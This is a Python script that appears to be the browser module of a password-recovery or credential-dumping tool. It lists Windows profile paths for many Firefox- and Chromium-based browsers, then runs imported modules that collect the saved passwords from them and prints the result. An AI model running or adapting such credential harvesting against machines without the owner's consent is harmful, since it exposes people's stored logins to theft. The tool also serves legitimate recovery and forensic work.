from libs.modules import run_module
from modules.chromium.chromium import Chromium
from modules.firefox.mozilla import Mozilla

firefox_browsers = [
	(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
	(u'blackHawk', u'{APPDATA}\\NETGATE Technologies\\BlackHawk'),
	(u'cyberfox', u'{APPDATA}\\8pecxstudios\\Cyberfox'),
	(u'comodo IceDragon', u'{APPDATA}\\Comodo\\IceDragon'),
	(u'k-Meleon', u'{APPDATA}\\K-Meleon'),
	(u'icecat', u'{APPDATA}\\Mozilla\\icecat'),
]

chromium_browsers = [
	(u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
	(u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
	(u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
	(u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
	(u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
	(u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
	(u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
	(u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
	(u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
	(u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
	(u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
	(u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
	(u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
	(u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
	(u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
	(u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
	(u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
	(u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
	(u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
	(u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
	(u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data')
]

if __name__ == '__main__':
	passwords = []
	mozilla_driver = [Mozilla(browser_name=name, path=path) for name, path in firefox_browsers]
	chromium_browsers = [Chromium(browser_name=name, paths=paths) for name, paths in chromium_browsers]
	run_module(passwords, mozilla_driver)
	run_module(passwords, chromium_browsers)
	print(passwords)
